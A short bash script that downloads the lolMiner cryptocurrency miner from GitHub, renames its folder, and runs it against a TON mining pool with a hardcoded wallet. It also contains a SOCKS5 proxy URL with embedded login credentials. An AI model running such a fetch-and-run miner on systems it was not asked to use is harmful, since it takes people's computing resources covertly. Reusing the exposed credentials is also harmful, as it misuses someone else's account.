#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz
tar xvf lolMiner_v1.41b_Lin64.tar.gz
mv 1.41b mng 
cd mng
chmod +x lolMiner 
./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQA0Q3JaZgjKJ6QVzETgz3xYfalnLCx170Ey8cEGhsnyLkdI
